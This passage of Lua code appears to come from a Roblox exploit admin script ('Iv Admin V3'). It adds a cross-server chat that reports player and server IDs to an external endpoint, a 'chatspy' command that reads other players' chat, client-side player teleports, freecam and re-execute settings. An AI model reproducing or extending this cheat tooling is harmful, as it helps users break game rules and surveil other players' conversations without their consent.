	local IvButtonFrame = IvChat.Objs.IvChat;
	local Cache = {Global = {}, Server = {}};
	local Message = function(Player, Message, ChatType)
		local Display = IvChat.Objs.Message:Clone();
		local toDisplay = '[%s]: %s';
	
		Display.Parent = IvChat.ChatBox[format('%sFrame', ChatType)].Logs;
		Display.Message.Text = format(toDisplay, Player[2], toStr(Message));
		Display.Data.MouseButton1Click:Connect(function()
			local DataFrame = IvChat.ChatBox.DataFrame;
			DataFrame.Visible = false;

			DataFrame.UUID.Value = Player[3];
			DataFrame.Profile.Image = pfp(Player[1]);
			DataFrame.Frame.Data.UserId.Text = Player[1];
			DataFrame.Frame.Data.User.Text = plrs:GetPlayerByUserId(Player[1]).Name;

			DataFrame.Visible = true;
		end)
	end

	local Upload = function(Player, img, ChatType)
		local File = IvChat.Objs.File:Clone();

		File.Message.Text = format('[%s]:', Player[2]);
		File.Picture.Image = loadAsset('Iv Chat imgs', img);
		File.Parent = IvChat.ChatBox[format('%sFrame', ChatType)].Logs;
		File.Data.MouseButton1Click:Connect(function()
			local DataFrame = IvChat.ChatBox.DataFrame;
			DataFrame.Visible = false;

			DataFrame.UUID.Value = Player[3];
			DataFrame.Profile.Image = pfp(Player[1]);
			DataFrame.Frame.Data.UserId.Text = Player[1];
			DataFrame.Frame.Data.User.Text = plrs:GetPlayerByUserId(Player[1]).Name;

			DataFrame.Visible = true;
		end)

		File.Message.Display.MouseButton1Click:Connect(function()
			File.Message.Display.Visible = false;
			File.Picture.Size = UDim2.new(0, 125, 0, 125);
			File.Picture:FindFirstChildWhichIsA('UIStroke').Enabled = true;
		end)

		File.Picture.MouseButton1Click:Connect(function()
			File.Message.Display.Visible = true;
			File.Picture.Size = UDim2.new(0, 125, 0, 0);
			File.Picture:FindFirstChildWhichIsA('UIStroke').Enabled = false;
		end)
	end
	
	Drag(IvChat.ChatBox);
	IvChat.Parent = Core;
	TopBarLeftFrame.ChatIcon.Size = UDim2.new(-0.015, 44, 1, 0);

	do
		local CanRefresh = true;
		local Connection = false;
		local Icon = IvChat.CTX.Icon;
		local Status = IvChat.CTX.Status;
		local Users = IvChat.ChatBox.Users;
		local Server = IvChat.ChatBox.Server;
		local Global = IvChat.ChatBox.Global;
		local UsersFrame = IvChat.ChatBox.UsersFarme;
		local GlobalFrame = IvChat.ChatBox.GlobalFrame;
		local ServerFrame = IvChat.ChatBox.ServerFrame;
		local isAddress = function(url, supported)
			for _, v in next, supported do
				if url:find(v) then
					return true;
				end
			end
			return nil;
		end

		local Refresh = function()
			local Hx2 = game:HttpGet('')
			local Temp, Temp2, Messages = {}, {}, {};

			for _, v in next, GlobalFrame.Logs:GetChildren() do
				if v:IsA('Frame') then
					v:Destroy();
				end
			end

			task.wait(0.5);
			for _, v in next, JSON('Decode', Hx2) do
				local PlayerID = _:split('+4976')[4];
				local Player = _:split('+4976')[3];
				local UUID = _:split('+4976')[2];
				local ID = _:split('+4976')[1];

				for _, v2 in next, unpack(v) do
					insert(Temp, toNum(v2:split('|556e6978|')[1]));
					Temp2[toNum(v2:split('|556e6978|')[1])] = {PlayerID, Player, format('id=%s&UUID=%s', ID, UUID)};
					Messages[toNum(v2:split('|556e6978|')[1])] = v2:split('|556e6978|')[2];
				end
			end

			sort(Temp);

			for _, v in ipairs(Temp) do
				if isAddress(Messages[v], {'.png', '.jpg', '.jpeg'}) and isAddress(Messages[v], {'https://'}) then
					Upload(Temp2[v], format('https://%s', Messages[v]:gsub(' ', ''):split('https://')[2]), 'Global');
				else
					Message(Temp2[v], Messages[v], 'Global');
				end
			end

			do
				for _, v in next, UsersFrame.Players:GetChildren() do
					if v:IsA('ImageLabel') then
						v:Destroy();
					end
				end
	
				task.wait(0.5);
	
				for _, v in next, JSON('Decode', Hx2) do
					local PlayerFrame = IvChat.Objs.Player:Clone();
					local PlayerID = _:split('+4976')[4];
					local Player = _:split('+4976')[3];
					local UUID = _:split('+4976')[2];
					local ID = _:split('+4976')[1];
	
					PlayerFrame.Parent = UsersFrame.Players;
					PlayerFrame.Profile.Image = pfp(PlayerID);
					PlayerFrame.Label.Text = format('User: <font color = \'rgb(255, 255, 255)\'>%s</font>', Player);
					PlayerFrame.Frame.Join.MouseButton1Click:Connect(function()
						xpcall(function()
							TeleportService:TeleportToPlaceInstance(toNum(ID), UUID, plr);
						end,
					
						function()
							Notify(format('Invalid or Unauthorized\n%s', UUID));
						end)
					end)
				end
				UsersFrame.Info.Text = format('[ + ] <font color = \'rgb(255, 255, 255)\'>Online Users</font> ${%d}', maxn(UsersFrame.Players:GetChildren()) - 1);

			end
		end

		IvButtonFrame.Frame.Chat.MouseButton1Click:Connect(function()
			IvChat.ChatBox.Visible = not IvChat.ChatBox.Visible;
		end)
		
		IvChat.ChatBox.Close.MouseButton1Click:Connect(function()
			IvChat.ChatBox.Visible = false;
		end)

		IvChat.ChatBox.Refresh.MouseButton1Click:Connect(function()
			if CanRefresh then
				CanRefresh = not CanRefresh;

				for i = 0, 360, 10 do
					IvChat.ChatBox.Refresh.Rotation = i; task.wait();
				end

				Refresh();
				IvChat.ChatBox.Refresh.Rotation = 0;
				CanRefresh = not CanRefresh;
			end
		end)

		IvChat.ChatBox.DataFrame.Frame.Data.Join.MouseButton1Click:Connect(function()
			xpcall(function()
				local Value = IvChat.ChatBox.DataFrame.UUID.Value;
				TeleportService:TeleportToPlaceInstance(Value:split('&')[1]:split('id=')[2], Value:split('&')[2]:split('UUID=')[2], plr);
			end,
		
			function()
				Notify(format('Invalid or Unauthorized\n%s', IvChat.ChatBox.DataFrame.UUID.Value:split('&')[2]));
			end)
		end)
	
		Server.Button.MouseButton1Click:Connect(function()
			Users.Button.TextColor3 = Color3.fromRGB(197, 197, 197);
			Global.Button.TextColor3 = Color3.fromRGB(197, 197, 197);
			Server.Button.TextColor3 = Color3.fromRGB(255, 255, 255);
			ServerFrame.Visible = true;
			GlobalFrame.Visible = false;
			UsersFrame.Visible = false;
		end)
	
		Global.Button.MouseButton1Click:Connect(function()
			Users.Button.TextColor3 = Color3.fromRGB(197, 197, 197);
			Server.Button.TextColor3 = Color3.fromRGB(197, 197, 197);
			Global.Button.TextColor3 = Color3.fromRGB(255, 255, 255);
			GlobalFrame.Visible = true;
			ServerFrame.Visible = false;
			UsersFrame.Visible = false;
		end)

		Users.Button.MouseButton1Click:Connect(function()
			Users.Button.TextColor3 = Color3.fromRGB(255, 255, 255);
			Server.Button.TextColor3 = Color3.fromRGB(197, 197, 197);
			Global.Button.TextColor3 = Color3.fromRGB(197, 197, 197);
			GlobalFrame.Visible = false;
			ServerFrame.Visible = false;
			UsersFrame.Visible = true;
		end)
	
		spawn(function()
			local Rotate = 0;
			repeat
				Icon.Rotation = Rotate;
				Rotate = Rotate >= 360 and 0 or Rotate + 5;
				task.wait();
			until Connection;
		end)
	
		spawn(function()
			IvChat.Destroying:Wait(); IvButtonFrame:Destroy();
			for _, v in next, RBX do
				Disconnect(v, RBX);
			end
		end)
	
		Status.Text = format('Status: <font color = \'rgb(255, 255, 255)\'>%s</font>', 'Connecting ...'); task.wait(1)
	
		local URL = '';
		local Hx = game:HttpGetAsync(format(URL, toStr(game.PlaceId), game.JobId, plr.Name, plr.UserId));
	
		if not match(toStr(Hx), 'Successfully') then
			Connection = nil;
			Status.Text = format('Status: <font color = \'rgb(255, 0, 0)\'>%s</font>', 'Failed to Connect!'); task.wait(0.8);
	
			for i = 0, 1, 0.01 do 
				Icon.ImageTransparency = Icon.ImageTransparency + i;
				Status.TextTransparency = Status.TextTransparency + i; task.wait();
			end
	
			IvChat.CTX:TweenSizeAndPosition(UDim2.new(0, 0, 0, 0), UDim2.new(0.5, 0, 0.5, 0), 'InOut', 'Sine', 1, true); task.wait(1);
			return IvChat:Destroy();
		end
	
		Connection = nil;
		Notify(Hx, pfp(plr.UserId), 5);
		IvButtonFrame.Parent = TopBarLeftFrame;
		Status.Text = format('Status: <font color = \'rgb(0, 255, 0)\'>%s</font>', 'Connected!'); task.wait(0.8);

		Refresh();
		for i = 0, 1, 0.01 do 
			Icon.ImageTransparency = Icon.ImageTransparency + i;
			Status.TextTransparency = Status.TextTransparency + i; task.wait();
		end
	
		IvChat.CTX:TweenSizeAndPosition(UDim2.new(0, 435, 0, 290), UDim2.new(0.386, 0, 0.328, 0), 'InOut', 'Sine', 1, true); task.wait(1);
		IvChat.ChatBox.Visible = true;
		IvChat.CTX.Visible = false;
		
		RBX['Server2'] = ServerFrame.ChatBar.Box.FocusLost:Connect(function(Enter)
			if Enter then
				local Text = ServerFrame.ChatBar.Box.Text;

				ServerFrame.ChatBar.Box.Text = '';

				if isAddress(Text, {'.png', '.jpg', '.jpeg'}) and isAddress(Text, {'https://'}) then
					Upload({plr.UserId, plr.Name, format('id=%s&UUID=%s', game.PlaceId, game.JobId)}, format('https://%s', Text:gsub(' ', ''):split('https://')[2]), 'Server');
				else
					Message({plr.UserId, plr.Name, format('id=%s&UUID=%s', game.PlaceId, game.JobId)}, format('<font color = \'rgb(255, 0, 0)\'>%s</font>', Text), 'Server');
				end
			end
		end)

		RBX['Global2'] = GlobalFrame.ChatBar.Box.FocusLost:Connect(function(Enter)
			if Enter then
				local Text = GlobalFrame.ChatBar.Box.Text;				
				local URL = '';
				local Hx = game:HttpGet(format(URL, tick(), toStr(game.PlaceId), game.JobId, plr.Name, plr.UserId, Text));

				GlobalFrame.ChatBar.Box.Text = '';

				Refresh()
			end
		end)
	end
end)

AddCommand('settings', {'ivsettings'}, 'Iv Settings', function()

	local IvSettings = Core:FindFirstChild('Iv-Settings')
	if not IvSettings then
		IvSettings = GetObjs(12199878745)
		IvSettings.Parent = Core
		IvSettings.Main.Exit.MouseButton1Click:Connect(function()
			IvSettings.Enabled = false
		end)

		Drag(IvSettings.Main, 15)
		insert(_G.IvAdminV3.UIs, IvSettings)

		-- // Boot:
		local Button = function(Text, Code)
			local Toggler = IvSettings.Objs.Toggle:Clone()
			local Enabled = false

			Toggler.Parent = IvSettings.Main.Frame
			Toggler.Label.Text = Text
			Toggler.Button.MouseButton1Click:Connect(function()
				Enabled = not Enabled
				spawn(function() Code(Enabled) end)
				Toggler.Button.BackgroundColor3 = Enabled and Color3.fromRGB(0, 170, 0) or Color3.fromRGB(170, 0, 0)
			end)
		end

		local Label = function(Text)
			local Label = IvSettings.Objs.Label:Clone()
			Label.Text = Text
			Label.Parent = IvSettings.Main.Frame
		end

		-- // Main:
		Button('Hide Tag', function(Enabled)
			Disconnect(GSignals['Overhead'])
			if plr.Character and plr.Character:FindFirstChild('Head') and plr.Character.Head:FindFirstChild('Client Bridge v3') then
				plr.Character.Head['Client Bridge v3'].Enabled = true
			end

			if Enabled then
				GSignals['Overhead'] = plr.CharacterAdded:Connect(function(Chr)
					repeat wait(0) until Chr:FindFirstChild('Head') wait(1)
					Chr.Head['Client Bridge v3'].Enabled = false
				end)
			
				if plr.Character and plr.Character:FindFirstChild('Head') and plr.Character.Head:FindFirstChild('Client Bridge v3') then
					plr.Character.Head['Client Bridge v3'].Enabled = false
				end
			end
 		end)

		Button('Hide All Tags', function(Enabled)
			GSignals['IvTags'] = GSignals['IvTags'] or {}
			
			for _, v in next, GSignals['IvTags'] do
				Disconnect(v.rbx)
				if v.Tag then
					v.Tag:Destroy()
				end
			end

			if Enabled then
				for _, v in next, filter(GetPlayers(), plr) do
					GSignals[format('%s\'s Overhead', v.Name)] = {}
					GSignals[format('%s\'s Overhead', v.Name)]['rbx'] = v.CharacterAdded:Connect(function(Chr)
						repeat wait(0) until Chr:FindFirstChild('Head') wait(1)
						if Chr.Head:FindFirstChild('Client Bridge v3') then
							Chr.Head['Client Bridge v3'].Enabled = false
						end
					end)

					if v.Character and v.Character:FindFirstChild('Head') and v.Character.Head:FindFirstChild('Client Bridge v3') then
						GSignals[format('%s\'s Overhead', v.Name)]['Tag'] = v.Character.Head['Client Bridge v3']
						v.Character.Head['Client Bridge v3'].Enabled = false
					end
				end
			end
		end)

		Button('Re-Execute', function(Enabled)
			_G.ReExecute = Enabled

			if _G.ReExecute or Notify('Re-Execute: Disabled') then
				Notify('Re-Execute: Enabled')
			end
		end)
	end

	IvSettings.Enabled = true
end)

AddCommand('stopexecute', {'stopexe', 'noexe'}, 'Iv will not re-execute', function()
	if _G.ReExecute then
		_G.ReExecute = false
		Notify('Successfully disabled re-execute')
	end
end)

AddCommand('joinalert', {'addalert'}, 'Alerts you when a specific player joins', function(Args)
	local Player = GetPlayer(Args[1])

	if Args then
		if find({'me', 'random', 'all', 'others', plr.Name}, Args[1]) or Player and Player == plr then
			return Notify('Actio not supported!')
		end

		if not toNum(Args[1]) then
			if Player or Notify(format('Could not find player \'%s\'', Args[1])) then
				if not find(PlayersData.Blacklisted, Player.Name) or Notify(format('\'%s\' already in Join Alerts!', Player.Name), pfp(Player.UserId)) then
					Notify(format('Added \'%s\' to Join Alerts!', Player.Name), pfp(Player.UserId))
					insert(PlayersData.Blacklisted, Player.Name)
					Save('PlayersData')
				end
			end
		elseif toNum(Args[1]) then
			xpcall(function()
				insert(PlayersData.Blacklisted, plrs:GetNameFromUserIdAsync(Args[1]))
				Notify(format('Added \'%s\' to Join Alerts!', plrs:GetNameFromUserIdAsync(Args[1])), pfp(Args[1]))
				Save('PlayersData')
			end, function()
				Notify(format('User \'%d\' does not Exist', toNum(Args[1])))
			end)
		end
	end
end)

AddCommand('removejalert', {'removealert', 'ralert'}, 'Removes Join Alert of player', function(Args)
	local Player = GetPlayer(Args[1])

	if Args then
		if find({'me', 'random', 'all', 'others', plr.Name}, Args[1]) or Player and Player == plr then
			return Notify('Actio not supported!')
		end

		if not toNum(Args[1]) then
			if Player or Notify(format('Could not find player \'%s\'', Args[1])) then
				if find(PlayersData.Blacklisted, Player.Name) or Notify(format('\'%s\' does not exist in Join Alerts!', Player.Name), pfp(Player.UserId)) then
					Notify(format('Removed \'%s\' from Join Alerts!', Player.Name), pfp(Player.UserId))
					remove(PlayersData.Blacklisted, isIndexOf(PlayersData.Blacklisted, Player.Name))
					Save('PlayersData')
				end
			end
		elseif toNum(Args[1]) then
			xpcall(function()
				if isIndexOf(PlayersData.Blacklisted, plrs:GetNameFromUserIdAsync(Args[1])) then
					remove(PlayersData.Blacklisted, isIndexOf(PlayersData.Blacklisted, plrs:GetNameFromUserIdAsync(Args[1])))
					Notify(format('Removed \'%s\' from Join Alerts!', plrs:GetNameFromUserIdAsync(Args[1])), pfp(Args[1]))
					Save('PlayersData')
				end
			end, function()
				Notify(format('User \'%d\' does not Exist', toNum(Args[1])))
			end)
		end
	end
end)

AddCommand('cbring', {'clientbring'}, 'TPs player to you on Client', function(Args)
	local Player = GetPlayer(Args[1])

	if Args[1] == 'all' or Args[1] == 'others' then
		for _, v in next, filter(GetPlayers(), plr) do
			if _G.ClientBring and v.Character then
				pcall(function()
					v.Character:SetPrimaryPartCFrame(plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, zAxis or 0))
				end)
			end
		end
	elseif Player or Notify(format('Could not find player: %s', Args[1])) then
		xpcall(function()
			Player.Character:SetPrimaryPartCFrame(plr.Character.HumanoidRootPart.CFrame)
		end, function()
			Notify('Could not bring player. Try again')
		end)
	end
end)

AddCommand('loopcbring', {'looopclientbring', 'lcbring'}, 'Constantly TPs player to you on Client', function(Args)
	local Player = GetPlayer(Args[1])
	local zAxis = toNum(Args[2])

	_G.ClientBring = false wait(0.5)
	_G.ClientBring = true

	if Args[1] == 'all' or Args[1] == 'others' then
		while _G.ClientBring and Heartbeat:Wait() do
			for _, v in next, filter(GetPlayers(), plr) do
				if _G.ClientBring and v.Character then
					pcall(function()
						v.Character:SetPrimaryPartCFrame(plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, zAxis or 0))
					end)
				end
			end
		end
	elseif Player or Notify(format('Could not find player: %s', Args[1])) then
		while _G.ClientBring and Heartbeat:Wait() do
			pcall(function()
				Player.Character:SetPrimaryPartCFrame(plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, zAxis or 0))
			end)
		end
	end
end)

AddCommand('unloopcbring', {'unloopclientbring', 'unlcbring'}, 'Stop TPing player to you', function()
	_G.ClientBring = false
end)

AddCommand('addkey', {'keybind', 'setkey'}, 'Sets a key bind to a command', function(Args)
	local Key, Command = Args[1], Args[2]

	if Key and Command or Notify('Missing Arguments!') then
		xpcall(function()
			local Key = Enum.KeyCode[Key]
			local isCommand = ((function()
				for _, v in next, Commands do
					if v.Command == lower(Command) then
						return true
					else
						for _, vi in next, v.Aliases do
							if vi == lower(Command) then
								return true
							end
						end
					end
				end
	
				return false
			end)())

			if not isCommand then
				return Notify(format('Command \'%s\' does not exist!', Command))
			end

			if Key then
				local isBind = false
				for _, v in next, Settings.Keybinds do
					if v['Key'] == sub(toStr(Key), 14) and v['Command'] ~= Command then
						Settings.Keybinds[_]['Command'] = Command
						isBind = true
					end
				end

				if not isBind then
					insert(Settings.Keybinds, {
						Key = sub(toStr(Key), 14),
						Command = Command
					})
				end

				Notify(format('Added Key bind to %s', Command))
				Save('Settings')
			end
		end, function()
			Notify('Key does not exist!')
		end)
	end
end)

AddCommand('removekey', {'removebind'}, 'Removes an existing key bind for a command', function(Args)
	local Command = Args[1]

	if Command or Notify('Missing Argument!') then
		local isCommand = ((function()
			for _, v in next, Commands do
				if v.Command == lower(Command) then
					return true
				else
					for _, vi in next, v.Aliases do
						if vi == lower(Command) then
							return true
						end
					end
				end
			end

			return false
		end)())

		if not isCommand then
			return Notify(format('Command \'%s\' does not exist!', Command))
		end

		for _, v in next, Settings.Keybinds do
			if v['Command'] == Command then
				Notify(format('Removed bind \'%s\' from \'%s\'', v.Key, v.Command))
				remove(Settings.Keybinds, _)
				Save('Settings')
				break
			end
		end
	end
end)

AddCommand('chatspy', {'cspy'}, 'Chat Spy', function()
	if _G.ChatSpyEnabled then
		return Notify('Chat Spy already enabled!')
	end

	_G.ChatSpyEnabled = true

	Notify('Chat Spy: Enabled')

	local Cache = {}
	local Log = function(Player, Message)
		local Display = '[%s]: %s'
		StarterGui:SetCore('ChatMakeSystemMessage', {
			Text = format(Display, Player.DisplayName, Message),
			Color = Color3.fromRGB(255, 255, 255),
			Font = Enum.Font.Cartoon,
			FontSize = Enum.FontSize.Size48
		})
	end

	for _, v in next, GetPlayers() do
		v.Chatted:Connect(function(msg)
			task.wait(0.45)
			if not find(Cache, format('%s%s%s', v.Name, msg, v.DisplayName)) then
				Log(v, msg)
			end
		end)
	end

	if OnMessageRemote then
		OnMessageRemote.OnClientEvent:Connect(function(Input)
			insert(Cache, format('%s%s%s', Input.FromSpeaker, Input.Message, GetPlayer(Input.FromSpeaker).DisplayName))
		end)
	end
end)

AddCommand('freecam', {'fcam', 'fc'}, 'Free Camera', function()
	if _G.IvFreeCam and not _G.IvFreeCam.Destroy and not _G.IvFreeCam.New then
		return Notify('Free Camera already Active!')
	end

	local Camera = workspace.CurrentCamera
	local Controller = Instance.new('Part', workspace)
	
	Camera.CameraSubject = Controller
	
	Controller.CanCollide = false
	Controller.Name = 'Iv Controller'
	Controller.Transparency = 1
	Controller.Size = Vector3.new(0, 0, 0)
	Controller.CFrame = plr.Character.Head.CFrame * CFrame.new(0, 4, 0)
	
	if not _G.IvFreeCam then
		_G.IvFreeCam = {
			CamSpeed = Settings.CamSpeed or 6,
			Destroy = false,
			OnCam = false,
			New = true,
		}
	end
	
	_G.IvFreeCam.New = false
	_G.IvFreeCam.Destroy = true
	RenderStepped:Wait()
	_G.IvFreeCam.Destroy = false
	local Cam = workspace.CurrentCamera
	local Mouse = plr:GetMouse()
	local Connections = {}
	local Binds = {
		[1] = {
			[1] = 0,
			[2] = 0,
			[3] = 0,
			[4] = 0
		},
	
		[2] = {
			[1] = 0,
			[2] = 0,
			[3] = 0,
			[4] = 0
		}
	}
	
	spawn(function()
		while not _G.IvFreeCam.Destroy and Stepped:Wait() do
			pcall(function()
				for _, v in next, plr.Character:GetChildren() do
					if v:IsA('BasePart') then
						v.Anchored = true
					end
				end
			end)
		end

		task.wait(0.5)
		pcall(function()
			for _, v in next, plr.Character:GetChildren() do
				if v:IsA('BasePart') then
					v.Anchored = false
				end
			end
		end)

		workspace.CurrentCamera.CameraSubject = plr.Character.Humanoid
	end)
	
	local BodyGyro = Instance.new('BodyGyro', Controller)
	local BodyVelocity = Instance.new('BodyVelocity', Controller)
	
	BodyGyro.P = 9e4
	BodyGyro.MaxTorque = Vector3.new(1/0, 1/0, 1/0)
	BodyGyro.CFrame = Controller.CFrame
	
	BodyVelocity.Velocity = Vector3.new(0, 1/10, 0)
	BodyVelocity.MaxForce = Vector3.new(1/0, 1/0, 1/0)
	
	Connections[#Connections + 1] = Mouse.KeyDown:Connect(function(Key)
		if Key == 'w' then
			Binds[1][1] = _G.IvFreeCam.CamSpeed
		elseif Key == 's' then
			Binds[1][2] = -_G.IvFreeCam.CamSpeed
		elseif Key == 'a' then
			Binds[1][3] = -_G.IvFreeCam.CamSpeed
		elseif Key == 'd' then
			Binds[1][4] = _G.IvFreeCam.CamSpeed
		end
	end)
	
	Connections[#Connections + 1] = Mouse.KeyUp:Connect(function(Key)
		if Key == 'w' then
			Binds[1][1] = 0
		elseif Key == 's' then
			Binds[1][2] = 0
		elseif Key == 'a' then
			Binds[1][3] = 0
		elseif Key == 'd' then
			Binds[1][4] = 0
		end
	end)
	
	Connections[#Connections + 1] = plr.CharacterAdded:Connect(function(Chr)
		_G.IvFreeCam.OnCam = false
	end)
	
	Connections[#Connections + 1] = Stepped:Connect(function()
		if _G.IvFreeCam.Destroy then
			BodyGyro:Destroy()
			Controller:Destroy()
			BodyVelocity:Destroy()
			_G.IvFreeCam.OnCam = false
			Notify('FreeCam: Disabled!')
	
			for _, v in next, Connections do
				Disconnect(v)
			end
			return
		end
	
		local Bind = ((Binds[1][3] + Binds[1][4]) ~= 0) or ((Binds[1][1] + Binds[1][2]) ~= 0)
		workspace.CurrentCamera.CameraSubject = Controller
	
		-- // Speed = Bind and _G.IvFreeCam.CamSpeed or (not Bind and (Speed ~= 0)) and 0;
		if Bind then
			Speed = _G.IvFreeCam.CamSpeed
		elseif not Bind and (Speed ~= 0) then
			Speed = 0
		end
	
		if Bind then
			BodyVelocity.Velocity = ((Cam.CoordinateFrame.LookVector * (Binds[1][1] + Binds[1][2])) + ((Cam.CoordinateFrame * CFrame.new(Binds[1][3] + Binds[1][4], (Binds[1][1] + Binds[1][2]) * 1/5, 0).p) - Cam.CoordinateFrame.p)) * Speed
		elseif Bind and (Speed ~= 0) then
			BodyVelocity.Velocity = ((Cam.CoordinateFrame.LookVector * (Binds[2][1] + Binds[2][2])) + ((Cam.CoordinateFrame * CFrame.new(Binds[2][3] + Binds[2][4], (Binds[2][1] + Binds[2][2]) * 1/5, 0).p) - Cam.CoordinateFrame.p)) * Speed
		else
			BodyVelocity.Velocity = Vector3.new(0, 1/1000, 0)
		end
	
		BodyGyro.CFrame = Cam.CoordinateFrame
	end)
end)

AddCommand('unfreecam', {'unfc', 'unfcam'}, 'No Free Camera', function()
	if _G.IvFreeCam then
		_G.IvFreeCam.Destroy = true
	end
end)

AddCommand('camspeed', {'cspeed'}, 'Free Camera Speed', function(Args)
	if Args[1] then
		if not _G.IvFreeCam then
			_G.IvFreeCam = {
				CamSpeed = Settings.CamSpeed or 6,
				Destroy = false,
				OnCam = false,
				New = true,
			}
		end

		_G.IvFreeCam.CamSpeed = toNum(Args[1])
		Settings.CamSpeed = toNum(Args[1]) or Settings.CamSpeed
		Notify(format('Set Camera Speed to %d', toNum(Args[1])))
		Save('Settings')
	end
end)
